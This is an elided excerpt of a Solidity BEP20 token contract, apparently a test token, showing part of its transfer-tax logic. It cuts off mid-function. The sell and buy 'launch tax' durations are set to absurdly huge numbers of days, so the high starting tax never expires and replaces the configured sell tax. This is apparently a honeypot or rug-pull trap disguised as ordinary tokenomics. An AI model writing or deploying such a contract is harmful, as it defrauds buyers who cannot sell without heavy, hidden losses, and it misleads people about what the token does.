...
// File: TEST TOKEN/Teesstteerr.sol
...
contract TestToken is IBEP20, Ownable
{
    ...
    function _taxedTransfer(address sender, address recipient, uint amount) private{
        ...
        uint tax;
        if(isSell){  
            uint SellTaxDuration=9999999999999999999999999999999999999999999999 days;          
            if(block.timestamp<LaunchTimestamp+SellTaxDuration){
                tax=_getStartTax(SellTaxDuration,200);
                }else tax=sellTax;
            }
        else if(isBuy){
            uint BuyTaxDuration=9999999999999999999999999999999999999999999999999999 days;
